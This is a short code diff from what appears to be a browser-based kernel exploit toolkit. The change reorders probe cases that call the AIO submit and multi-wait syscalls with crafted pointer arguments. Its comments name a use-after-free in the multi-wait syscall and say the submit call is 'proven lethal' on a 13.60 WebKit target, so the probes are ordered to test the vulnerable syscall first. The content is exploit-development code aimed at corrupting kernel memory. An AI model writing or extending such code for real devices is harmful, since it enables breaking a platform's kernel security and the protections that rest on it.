@@ -326,11 +326,13 @@ export function makeBagagwaEngine(X) {
         if (!zs || !ids) { note("[PROBE] AIO cases skipped (OOM)"); return; }
         for (let i = 0; i < 0x40; i++) zs.u8[i] = 0;
         w32(ids.u8, 0, 0); w32(ids.u8, 4, 1);
+        // wait-cases first: submit is already proven lethal on 13.60
+        // WebKit, so ask multi_wait (the UAF syscall itself) before dying.
         const cases = [
-            ["submit(1,ptr)", SYS_AIO_SUBMIT, [1, zs.base]],
-            ["submit(ptr,1)", SYS_AIO_SUBMIT, [zs.base, 1]],
             ["wait(ids,2,0,0)", SYS_AIO_MULTI_WAIT, [ids.base, 2, 0, 0]],
             ["wait(0,ids,2,0)", SYS_AIO_MULTI_WAIT, [0, ids.base, 2, 0]],
+            ["submit(1,ptr)", SYS_AIO_SUBMIT, [1, zs.base]],
+            ["submit(ptr,1)", SYS_AIO_SUBMIT, [zs.base, 1]],
         ];
         for (const [label, num, args] of cases) {
             if (P.syscalls[num] === undefined) { note("[PROBE] " + label + ": no stub"); continue; }
